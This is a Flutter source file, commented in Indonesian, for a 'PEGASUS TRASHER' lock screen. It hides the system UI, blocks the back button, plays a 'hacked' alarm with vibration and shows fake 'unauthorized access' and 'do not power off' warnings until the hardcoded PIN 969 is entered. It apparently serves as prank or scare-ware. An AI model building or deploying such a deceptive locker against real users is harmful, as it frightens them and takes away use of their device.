import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:vibration/vibration.dart';
import 'utils/audio_player.dart';

class LockScreen extends StatefulWidget {
  const LockScreen({super.key});

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  final TextEditingController _pinController = TextEditingController();
  bool _showError = false;
  bool _isPlaying = false;
  bool _isVibrating = false;

  @override
  void initState() {
    super.initState();
    _initializeLock();
  }

  Future<void> _initializeLock() async {
    // Full immersive mode
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);

    // Start audio
    await AudioUtil.playHackedSound();
    _isPlaying = true;

    // Vibrate
    _vibrateDevice();
  }

  Future<void> _vibrateDevice() async {
    if (_isVibrating) return;
    
    final hasVibrator = await Vibration.hasVibrator() ?? false;
    if (hasVibrator) {
      _isVibrating = true;
      Vibration.vibrate(duration: 1000);
      await Future.delayed(const Duration(seconds: 2));
      _isVibrating = false;
    }
  }

  Future<void> _checkPin() async {
    if (_pinController.text == '969') {
      // PIN benar - unlock
      await AudioUtil.stopAudio();
      await SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
      SystemNavigator.pop();
    } else {
      // PIN salah - efek
      setState(() => _showError = true);
      _pinController.clear();
      
      // Vibrate pattern: pendek-panjang-pendek
      final hasVibrator = await Vibration.hasVibrator() ?? false;
      if (hasVibrator) {
        Vibration.vibrate(pattern: [0, 200, 100, 500]);
      }
      
      // Restart audio
      await AudioUtil.stopAudio();
      await Future.delayed(const Duration(milliseconds: 300));
      await AudioUtil.playHackedSound();
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        // Getar kalau coba back
        final hasVibrator = await Vibration.hasVibrator() ?? false;
        if (hasVibrator) {
          Vibration.vibrate(duration: 150);
        }
        return false;
      },
      child: Scaffold(
        backgroundColor: Colors.black,
        body: GestureDetector(
          onTap: () {
            // Mainkan audio kalau layar disentuh
            if (!_isPlaying) {
              AudioUtil.playHackedSound();
              _isPlaying = true;
            }
          },
          child: Stack(
            children: [
              // Background gradient animasi
              AnimatedContainer(
                duration: const Duration(seconds: 7),
                decoration: BoxDecoration(
                  gradient: RadialGradient(
                    colors: [
                      const Color(0xFF0A2463),
                      const Color(0xFF1E3A8A),
                      Colors.black,
                    ],
                    stops: const [0.1, 0.5, 1.0],
                    center: Alignment.topLeft,
                  ),
                ),
              ),

              // Scan lines effect
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [
                      Colors.transparent,
                      Colors.blueAccent.withOpacity(0.05),
                      Colors.transparent,
                    ],
                    stops: const [0.0, 0.5, 1.0],
                  ),
                ),
              ),

              // Main content
              Center(
                child: Container(
                  width: MediaQuery.of(context).size.width * 0.85,
                  constraints: const BoxConstraints(maxWidth: 350),
                  padding: const EdgeInsets.all(25),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.8),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(
                      color: _showError ? Colors.red : Colors.blueAccent,
                      width: 3,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: (_showError ? Colors.red : Colors.blueAccent)
                            .withOpacity(0.4),
                        blurRadius: 30,
                        spreadRadius: 5,
                      ),
                    ],
                  ),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      // Logo & Title
                      const Column(
                        children: [
                          Icon(
                            Icons.lock_person,
                            size: 70,
                            color: Colors.blueAccent,
                          ),
                          SizedBox(height: 15),
                          Text(
                            'PEGASUS TRASHER',
                            style: TextStyle(
                              fontSize: 22,
                              fontWeight: FontWeight.bold,
                              color: Colors.white,
                              fontFamily: 'ShareTechMono',
                              letterSpacing: 3,
                            ),
                          ),
                          SizedBox(height: 5),
                          Text(
                            'SECURITY SYSTEM ACTIVE',
                            style: TextStyle(
                              color: Colors.blueAccent,
                              fontSize: 12,
                              letterSpacing: 2,
                            ),
                          ),
                        ],
                      ),

                      const SizedBox(height: 30),

                      // Status warning
                      Container(
                        padding: const EdgeInsets.symmetric(
                          horizontal: 15,
                          vertical: 8,
                        ),
                        decoration: BoxDecoration(
                          color: Colors.red.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: Colors.red),
                        ),
                        child: const Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(
                              Icons.warning_amber_rounded,
                              color: Colors.red,
                              size: 14,
                            ),
                            SizedBox(width: 8),
                            Text(
                              'DEVICE LOCKED • UNAUTHORIZED ACCESS',
                              style: TextStyle(
                                color: Colors.red,
                                fontSize: 11,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                          ],
                        ),
                      ),

                      const SizedBox(height: 35),

                      // PIN Input
                      const Text(
                        'ENTER UNLOCK PIN',
                        style: TextStyle(
                          color: Colors.blueGrey,
                          fontSize: 12,
                          letterSpacing: 2,
                        ),
                      ),
                      const SizedBox(height: 10),

                      TextField(
                        controller: _pinController,
                        obscureText: true,
                        maxLength: 3,
                        textAlign: TextAlign.center,
                        style: const TextStyle(
                          fontSize: 36,
                          color: Colors.white,
                          fontFamily: 'ShareTechMono',
                          letterSpacing: 15,
                          fontWeight: FontWeight.bold,
                        ),
                        decoration: InputDecoration(
                          hintText: '• • •',
                          hintStyle: const TextStyle(
                            color: Colors.blueGrey,
                            letterSpacing: 15,
                          ),
                          counterText: '',
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide(
                              color: _showError ? Colors.red : Colors.blueAccent,
                              width: 2,
                            ),
                          ),
                          enabledBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide(
                              color: _showError ? Colors.red : Colors.blueAccent,
                              width: 2,
                            ),
                          ),
                          filled: true,
                          fillColor: Colors.black.withOpacity(0.5),
                          contentPadding: const EdgeInsets.all(20),
                        ),
                        keyboardType: TextInputType.number,
                        onChanged: (value) {
                          if (value.length == 3) {
                            _checkPin();
                          }
                          if (_showError) {
                            setState(() => _showError = false);
                          }
                        },
                      ),

                      // Error message
                      if (_showError)
                        Padding(
                          padding: const EdgeInsets.only(top: 20),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              const Icon(
                                Icons.error_outline,
                                color: Colors.red,
                                size: 16,
                              ),
                              const SizedBox(width: 8),
                              Text(
                                'ACCESS DENIED • TRY AGAIN',
                                style: TextStyle(
                                  color: Colors.red[400],
                                  fontSize: 13,
                                  fontFamily: 'ShareTechMono',
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                            ],
                          ),
                        ),

                      const SizedBox(height: 25),

                      // Hint (sangat samar)
                      const Opacity(
                        opacity: 0.3,
                        child: Text(
                          'Unlock code: ***',
                          style: TextStyle(
                            color: Colors.blueGrey,
                            fontSize: 10,
                          ),
                        ),
                      ),

                      // Hidden unlock button (transparan tapi bisa diklik)
                      const SizedBox(height: 20),
                      Opacity(
                        opacity: 0.01, // Hampir tidak terlihat
                        child: SizedBox(
                          width: double.infinity,
                          child: ElevatedButton(
                            onPressed: _checkPin,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.blueAccent,
                              padding: const EdgeInsets.symmetric(vertical: 16),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(10),
                              ),
                            ),
                            child: const Text(
                              'UNLOCK DEVICE',
                              style: TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                                fontFamily: 'ShareTechMono',
                              ),
                            ),
                          ),
                        ),
                      ),

                      // Footer
                      const SizedBox(height: 25),
                      const Divider(color: Colors.blueGrey, height: 1),
                      const SizedBox(height: 15),
                      const Text(
                        '© 2024 Pegasus Security • v1.0',
                        style: TextStyle(
                          color: Colors.blueGrey,
                          fontSize: 9,
                        ),
                      ),
                    ],
                  ),
                ),
              ),

              // System info bottom
              Positioned(
                bottom: 30,
                left: 0,
                right: 0,
                child: Column(
                  children: [
                    Container(
                      width: 150,
                      height: 2,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [
                            Colors.transparent,
                            Colors.blueAccent,
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                    const SizedBox(height: 15),
                    const Text(
                      'SYSTEM STATUS: FULL LOCK • DO NOT POWER OFF',
                      style: TextStyle(
                        color: Colors.blueAccent,
                        fontSize: 10,
                        fontFamily: 'ShareTechMono',
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    AudioUtil.dispose();
    _pinController.dispose();
    super.dispose();
  }
}
